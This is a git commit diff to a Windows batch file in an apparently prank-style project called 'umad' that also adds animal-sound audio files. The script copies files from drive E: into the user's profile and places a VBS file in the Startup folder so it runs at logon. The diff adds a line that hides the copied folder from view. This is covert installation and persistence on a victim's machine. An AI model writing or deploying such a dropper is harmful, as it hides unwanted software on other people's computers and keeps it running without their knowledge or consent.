9a2ebec30921fa76670f2b8c7ea44204b37fb71d
Victor Johnson <95552161+realmichealbay@users.noreply.github.com>
2023-05-02 14:32:40 -0500

    On branch master  Changes to be committed: 	modified:   Nuclear_Silo/ips.json	renamed:     umad/Audio/crows.mp3 -> umad/Audio/crows.wav 	new file:   umad/Audio/horse1.wav 	new file:   umad/Audio/horse2.wav 	new file:   umad/Audio/meow1.wav 	new file:   umad/Audio/moo1.wav 	new file:   umad/Audio/morse.wav 	modified:   umad/start.bat 	modified:   umad/startserver.bat

--- umad/start.bat
+++ umad/start.bat
@@ -1,5 +1,6 @@
 @echo off
 mkdir C:\users\%USERNAME%\umad
+attrib +h C:\users\%USERNAME%\umad /d /s
 xcopy E:\umad C:\users\%USERNAME%\umad /v /q /c /y /e
 copy Startup\startup_main.vbs C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup /v /y
 echo installing dependencies
